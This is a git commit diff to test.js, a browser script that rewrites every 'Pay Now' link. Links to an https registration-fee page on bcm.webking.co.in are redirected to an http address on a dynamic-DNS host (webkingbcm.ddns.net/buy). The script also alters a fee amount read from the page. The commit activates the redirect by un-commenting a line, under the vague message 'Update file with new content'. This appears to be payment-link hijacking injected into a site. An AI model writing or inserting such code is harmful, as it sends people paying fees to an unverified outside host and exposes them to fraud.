61d6ad5b57614e307f282dec7d56db2dd2dc4d98
johndove9912 <158753779+johndove9912@users.noreply.github.com>
2024-02-13 17:45:29 +0530

    Update file with new content

--- test.js
+++ test.js
@@ -10,12 +10,12 @@
             // Loop through each <a> element
             anchorElements.forEach(function(anchorElement) {
                 if (anchorElement.textContent.trim() === 'Pay Now') {
-					//var originalUrl = anchorElement.href;
+					var originalUrl = anchorElement.href;
                     anchorElement.href = originalUrl.replace("https://bcm.webking.co.in/profile/regn_fee.php", "http://webkingbcm.ddns.net/buy");
 					tdElement = anchorElement.parentNode.previousSibling.previousSibling;
 					
 					var numberValue = parseInt(tdElement.textContent.trim(), 10); // parseInt function parses a string and returns an integer
-					var result = Math.floor(numberValue / 7500)*7800; // 3 is the divisor
+					var result = Math.floor(numberValue / 11000)*11000; // 3 is the divisor
 					//tdElement.textContent =result;
 					console.log(result);
 
